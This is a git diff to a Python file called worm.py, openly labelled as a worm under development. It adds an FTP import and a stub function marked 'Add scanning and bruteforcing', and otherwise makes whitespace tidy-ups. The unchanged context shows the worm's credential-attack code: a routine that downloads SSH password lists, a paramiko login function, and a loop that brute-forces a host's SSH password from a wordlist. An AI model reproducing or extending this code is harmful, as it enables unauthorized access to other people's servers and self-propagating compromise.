@@ -1,6 +1,6 @@
 ####################################
 # File name: worm.py               #
-# Author: Filip Komárek   (pylyf)#
+# Author: Filip Komárek   (pylyf)  #
 # Status: Development              #
 # Date created: 7/6/2018           #
 ####################################
@@ -12,12 +12,13 @@ import socket
 from urllib.request import urlopen
 import urllib
 import time
-
+from ftplib import FTP
+import ftplib
 # ------------------- Logging ----------------------- #
 logger = logging.getLogger(__name__)
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)
-debug = True # Set this to True to see debug messages
+debug = True  # Set this to True to see debug messages
 # --------------------------------------------------- #
 
 def debug_print(text):
@@ -92,6 +93,15 @@ def download_ssh_passwords(filename):
     debug_print("Passwords downloaded!")
 
 
+def connect_to_ftp(host, username, password):
+    # TODO : Finish this function + Add scanning and bruteforcing
+    try:
+        ftp = FTP(host)
+        ftp.login(username, password)
+    except ftplib.all_errors:
+        pass
+
+
 def connect_to_ssh(host, password):
     """
     Tries to connect to a SSH server
@@ -120,11 +130,11 @@ def connect_to_ssh(host, password):
     except paramiko.ssh_exception.AuthenticationException:
         debug_print("Wrong Password or Username")
         return False
-    except paramiko.ssh_exception.SSHException as e:
+    except paramiko.ssh_exception.SSHException:
         # socket is open, but not SSH service responded
         return False
 
-    
+
 def bruteforce_ssh(host, wordlist):
     """
     Calls connect_to_ssh function and
@@ -140,3 +150,4 @@ def bruteforce_ssh(host, wordlist):
         connection = connect_to_ssh(host, line)
         print(connection)
         time.sleep(5)
+
